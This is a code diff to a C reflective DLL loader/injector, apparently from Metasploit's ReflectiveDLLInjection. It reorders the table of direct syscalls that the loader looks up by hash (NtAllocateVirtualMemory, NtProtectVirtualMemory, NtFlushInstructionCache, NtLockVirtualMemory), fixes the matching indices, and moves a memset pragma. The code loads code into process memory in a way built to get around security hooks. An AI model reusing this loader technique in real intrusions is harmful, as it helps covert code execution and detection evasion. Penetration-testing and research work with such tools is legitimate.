@@ -59,6 +59,7 @@ __declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER
 // This is fine in a normal context, but here, it fails with an Access Violation since the compiler intrinsic function contains pointers to undefined memory locations.
 // The reason is because this custom loader lives in a local memory space, any addresses pointing to anything outside of the ".text" section will be wrong.
 // Forcing the use of a non-intrinsic custom version of memset seems to fix this.
+#pragma function(memset)
 void* __cdecl memset(void* s, int c, size_t n)
 {
 	BYTE* buf = (BYTE*)s;
@@ -66,7 +67,6 @@ void* __cdecl memset(void* s, int c, size_t n)
 		*buf++ = (BYTE)c;
 	return s;
 }
-#pragma function(memset)
 
 // This is our position independent reflective DLL loader/injector
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
@@ -100,14 +100,25 @@ RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	PVOID pNtdllBase = NULL, pKernel32 = NULL;
 
 	// The NTDLL exported functions our loader needs. This array of Syscall structures will be completed later.
-	Syscall Syscalls[] = {
-		{.dwCryptedHash = NTALLOCATEVIRTUALMEMORY_HASH, .dwNumberOfArgs = 6, .hooked = FALSE}, // NtAllocateVirtualMemory
 #ifdef ENABLE_STOPPAGING
-		{.dwCryptedHash = NTLOCKVIRTUALMEMORY_HASH, .dwNumberOfArgs = 4, .hooked = FALSE}, // NtLockVirtualMemory
+	Syscall Syscalls[4];
+#else
+	Syscall Syscalls[3];
 #endif
-		{.dwCryptedHash = NTPROTECTVIRTUALMEMORY_HASH, .dwNumberOfArgs = 5, .hooked = FALSE}, // NtProtectVirtualMemory
-		{.dwCryptedHash = NTFLUSHINSTRUCTIONCACHE_HASH, .dwNumberOfArgs = 3, .hooked = FALSE} // NtFlushInstructionCache
-	};
+	Syscalls[0].dwCryptedHash = NTALLOCATEVIRTUALMEMORY_HASH;
+	Syscalls[0].dwNumberOfArgs = 6;
+	Syscalls[0].hooked = FALSE;
+	Syscalls[1].dwCryptedHash = NTPROTECTVIRTUALMEMORY_HASH;
+	Syscalls[1].dwNumberOfArgs = 5;
+	Syscalls[1].hooked = FALSE;
+	Syscalls[2].dwCryptedHash = NTFLUSHINSTRUCTIONCACHE_HASH;
+	Syscalls[2].dwNumberOfArgs = 3;
+	Syscalls[2].hooked = FALSE;
+#ifdef ENABLE_STOPPAGING
+	Syscalls[3].dwCryptedHash = NTLOCKVIRTUALMEMORY_HASH;
+	Syscalls[3].dwNumberOfArgs = 4;
+	Syscalls[3].hooked = FALSE;
+#endif
 
 
 	// STEP 0: calculate our images current base address
@@ -137,7 +148,6 @@ RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
 
 	// STEP 1: process kernel32 exports for the functions our loader needs and setup the direct syscalls functions
-
 	findModules(&pNtdllBase, &pKernel32);
 	if (pNtdllBase == NULL || pKernel32 == NULL)
 		return 0;
@@ -165,7 +175,7 @@ RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 #ifdef ENABLE_STOPPAGING
 	// prevent our image from being swapped to the pagefile
 	// This fails on Windows Server 2012 with error 0xC00000A1 STATUS_WORKING_SET_QUOTA, but it doesn't seem to be an issue.
-	msfNtLockVirtualMemory(&Syscalls[1], (HANDLE)-1, &((PVOID)uiBaseAddress), &RegionSize, 1); // MapType 1 = MAP_PROCESS
+	msfNtLockVirtualMemory(&Syscalls[3], (HANDLE)-1, &((PVOID)uiBaseAddress), &RegionSize, 1); // MapType 1 = MAP_PROCESS
 #endif
 
 	// we must now copy over the headers
@@ -396,7 +406,7 @@ RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
 
 		if (uiValueD)
-			msfNtProtectVirtualMemory(&Syscalls[2], (HANDLE)-1, &((PVOID)uiValueB), &uiValueD, dwProtect, &dwProtect);
+			msfNtProtectVirtualMemory(&Syscalls[1], (HANDLE)-1, &((PVOID)uiValueB), &uiValueD, dwProtect, &dwProtect);
 
 		// get the VA of the next section
 		uiValueA += sizeof( IMAGE_SECTION_HEADER );
@@ -409,7 +419,7 @@ RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
 
 	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
-	msfNtFlushInstructionCache(&Syscalls[3], (HANDLE) -1, NULL, 0);
+	msfNtFlushInstructionCache(&Syscalls[2], (HANDLE) -1, NULL, 0);
 
 	// call our respective entry point, fudging our hInstance value
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
